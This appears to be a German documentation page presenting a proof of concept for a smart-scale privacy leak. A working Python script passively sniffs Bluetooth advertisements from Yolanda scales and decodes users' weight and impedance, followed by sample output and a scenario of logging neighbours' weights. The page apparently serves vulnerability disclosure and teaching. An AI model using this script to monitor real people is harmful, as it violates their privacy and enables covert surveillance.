---
sidebar_position: 3
title: "Proof of Concept"
---

# Smart Waage - PoC

## Passiver Scanner

```python
#!/usr/bin/env python3
"""
Smart Scale Privacy Leak PoC
Passively monitors weight data from advertising
"""

from blatann import BleDevice
from blatann.utils import setup_logger
import struct

TARGET_COMPANY_ID = 0x05C0  # Yolanda

def decode_manufacturer_data(data):
    """Decode weight from manufacturer data"""
    if len(data) < 4:
        return None
    
    company_id = struct.unpack('<H', data[0:2])[0]
    if company_id != TARGET_COMPANY_ID:
        return None
    
    weight_raw = struct.unpack('>H', data[2:4])[0]
    weight_kg = weight_raw / 100
    
    # Optional: Impedance
    impedance = None
    if len(data) >= 6:
        impedance = struct.unpack('>H', data[4:6])[0]
    
    return {
        'weight_kg': weight_kg,
        'impedance': impedance,
        'raw': data.hex()
    }

def main():
    setup_logger(level="WARNING")
    
    ble = BleDevice("/dev/ttyACM0")
    ble.configure()
    ble.open()
    
    print("🔍 Scanning for smart scales...")
    print("   (Step on your scale to see data)")
    print("-" * 50)
    
    def on_scan(sender, report):
        # Check for manufacturer data
        mfr_data = report.advertise_data.manufacturer_specific_data
        if not mfr_data:
            return
        
        result = decode_manufacturer_data(mfr_data)
        if result:
            name = report.advertise_data.local_name or "Unknown"
            print(f"⚖️  {name} @ {report.peer_address}")
            print(f"   Weight: {result['weight_kg']:.2f} kg")
            if result['impedance']:
                print(f"   Impedance: {result['impedance']}")
            print(f"   Raw: {result['raw']}")
            print()
    
    ble.scanner.on_scan_received.register(on_scan)
    
    try:
        while True:
            ble.scanner.start_scan().wait(timeout=5)
    except KeyboardInterrupt:
        print("\n👋 Stopped")
    finally:
        ble.close()

if __name__ == "__main__":
    main()
```

## Demo-Ausgabe

```
🔍 Scanning for smart scales...
   (Step on your scale to see data)
--------------------------------------------------
⚖️  Yoda1 @ XX:XX:XX:XX:XX:XX
   Weight: 78.50 kg
   Impedance: 452
   Raw: c0051e9201c4

⚖️  Yoda1 @ XX:XX:XX:XX:XX:XX
   Weight: 78.52 kg
   Impedance: 451
   Raw: c0051e9401c3
```

## Angriffsszenario

```bash
# Angreifer im Fitnessstudio / Nachbarwohnung
python3 waage_poc.py > weight_log.txt

# Nach einigen Tagen: Gewichtsverlauf der Nachbarn!
cat weight_log.txt | grep "XX:XX:XX"
```
